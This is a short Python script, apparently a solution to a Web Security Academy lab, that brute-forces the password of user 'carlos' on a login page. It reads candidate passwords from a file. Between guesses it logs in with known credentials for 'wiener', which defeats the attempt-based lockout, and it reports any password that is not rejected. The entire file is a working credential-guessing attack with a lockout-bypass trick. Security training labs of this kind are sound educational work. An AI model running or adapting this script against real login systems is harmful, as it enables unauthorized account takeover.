import requests

url = 'https://0a66006703d0feed806a804000300055.web-security-academy.net/login'


lines = [line.strip() for line in open("../pass.txt", "r")]
i=0
for line in lines:
    if(i%2==0):
        print(i)
        owo = requests.post(url, data={"username":"wiener", "password":"peter"})
    payload = {"username" : "carlos", "password" : line}
    owo = requests.post(url, data=payload)
    if not "Incorrect" in owo.text:
        print(line)
    i+=1
